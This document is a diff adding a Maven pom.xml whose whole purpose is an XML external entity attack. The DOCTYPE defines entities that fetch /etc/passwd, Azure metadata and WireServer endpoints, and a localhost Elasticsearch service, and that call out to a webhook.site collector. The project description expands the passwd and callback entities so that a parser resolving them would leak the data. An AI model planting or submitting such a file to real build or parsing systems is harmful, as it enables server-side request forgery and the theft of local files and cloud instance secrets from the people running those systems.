@@ -1,0 +1,15 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE project [
+  <!ENTITY oob    SYSTEM "http://webhook.site/bfac32e7-7c67-41f0-bf29-b2c2ff7238ce/?xxe=pom-ssrf&n=35422">
+  <!ENTITY imds   SYSTEM "http://169.254.169.254/metadata/instance?api-version=2021-02-01">
+  <!ENTITY wire   SYSTEM "http://168.63.129.16/">
+  <!ENTITY local  SYSTEM "http://localhost:9200/">
+  <!ENTITY passwd SYSTEM "file:///etc/passwd">
+]>
+<project xmlns="http://maven.apache.org/POM/4.0.0">
+  <modelVersion>4.0.0</modelVersion>
+  <groupId>com.ssrf.35422</groupId>
+  <artifactId>internal-ssrf</artifactId>
+  <version>1.0.0</version>
+  <description>oob=&oob; passwd=&passwd;</description>
+</project>
